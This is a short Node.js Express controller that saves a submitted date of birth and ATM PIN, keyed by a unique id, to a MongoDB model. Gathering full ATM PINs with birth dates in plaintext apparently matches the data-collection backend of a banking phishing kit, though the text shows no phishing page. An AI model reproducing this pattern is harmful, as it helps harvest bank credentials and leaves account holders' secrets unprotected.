const DobAtmData = require('../models/DobAtmData');

exports.saveDobAtmData = async (req, res) => {
    try {
        const { uniqueid, dob, atmPin } = req.body;
        let dobAtm = await DobAtmData.findOne({ uniqueid });

        if (dobAtm) {
            dobAtm.entries.push({ dob, atmPin });
        } else {
            dobAtm = new DobAtmData({
                uniqueid,
                entries: [{ dob, atmPin }]
            });
        }

        await dobAtm.save();

        res.status(200).json({
            success: true,
            message: "Dob and ATM data submitted successfully!"
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({
            success: false,
            message: "Error occurred while submitting Dob and ATM data."
        });
    }
};
